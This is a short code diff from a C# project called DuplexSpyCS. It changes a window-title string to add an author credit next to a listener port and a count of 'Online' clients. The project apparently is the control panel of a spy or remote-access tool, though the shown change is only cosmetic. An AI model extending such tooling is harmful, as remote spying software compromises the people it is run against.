@@ -1516,7 +1516,7 @@ namespace DuplexSpyCS
 
         private void timer1_Tick(object sender, EventArgs e)
         {
-            Text = $"DuplexSpyCS v1.0.0 | Port[{(listener == null || listener.port == -1 ? string.Empty : listener.port)}] | Online[{listView1.Items.Count}] | Selected [{listView1.SelectedItems.Count}]";
+            Text = $"DuplexSpyCS v1.0.0 by ISSAC | Port[{(listener == null || listener.port == -1 ? string.Empty : listener.port)}] | Online[{listView1.Items.Count}] | Selected [{listView1.SelectedItems.Count}]";
         }
 
         private void listView1_ColumnWidthChanging(object sender, ColumnWidthChangingEventArgs e)
